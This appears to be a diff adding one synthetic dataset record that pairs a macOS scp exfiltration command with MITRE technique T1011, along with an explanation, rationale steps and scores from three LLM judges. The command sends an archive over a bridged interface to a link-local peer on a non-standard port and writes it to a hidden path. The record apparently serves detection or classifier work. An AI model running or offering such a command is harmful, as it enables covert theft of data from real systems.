@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "scp -B -o BindAddress=\"$(ipconfig getv6ifaddr bridge0)\" -P 56432 /tmp/diag.tgz \"u@[fe80::4:feed:1%bridge0]:/tmp/.u\"",
+  "explanation": "Uses SSH file copy bound to the bridge0 interface IPv6 address and a high custom port to move data over a bridged, non-default medium, aligning with T1011 by avoiding the primary interface.",
+  "rationale_steps": [
+    "Obtain the IPv6 address of bridge0 via ipconfig to select a secondary medium.",
+    "Bind the SSH client to that address to force traffic over bridge0.",
+    "Transfer data to a link-local peer on a non-standard port."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-7a6bf8eb-8073e46c",
+  "source_prompt_hash": "7a6bf8eb",
+  "timestamp_utc": "2025-09-30T08:23:23.913402Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The scp command uses valid flags (-B, -o BindAddress=..., -P), balanced quoting, and correctly formatted bracketed IPv6 with a zone index, making it well-formed and parseable.",
+        "semantic_score": 4,
+        "semantic_justification": "Binding to bridge0’s IPv6 and targeting a link-local IPv6 scoped to bridge0 plausibly forces exfiltration over a non-default interface/medium and custom port consistent with T1011, assuming bridge0 exists and has IPv6, though the technique’s ‘other medium’ aspect is somewhat context-dependent.",
+        "combined_score": 4.5,
+        "confidence": 0.78,
+        "timestamp": "2025-10-01T00:03:32.988902Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The command is well-formed with balanced quotes and valid flags, though the subshell `$(ipconfig getv6ifaddr bridge0)` is a macOS-specific construct that may not reliably return a usable bind address in all environments, and the IPv6 link-local address with zone ID in the destination requires careful shell escaping that appears correct but is edge-case sensitive.",
+        "semantic_score": 4,
+        "semantic_justification": "The command plausibly achieves T1011 by binding SCP to a bridge0 interface (a non-primary, bridged network medium) with a high non-standard port and IPv6 link-local addressing, which would route traffic over a different network path than the default interface, though bridge0 on macOS is typically a virtual bridge rather than a distinct physical medium like cellular or Wi-Fi, slightly reducing alignment with the technique's core intent.",
+        "combined_score": 4.0,
+        "confidence": 0.75,
+        "timestamp": "2026-02-18T21:53:42.864807Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly formed for macOS, using valid scp flags, correct command substitution syntax, and properly escaped/quoted IPv6 link-local address formatting.",
+        "semantic_score": 5,
+        "semantic_justification": "The command effectively forces exfiltration over a specific interface (bridge0) by binding the source address and targeting a link-local IPv6 address, accurately reflecting the intent of T1011.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2026-02-18T21:53:50.134420Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
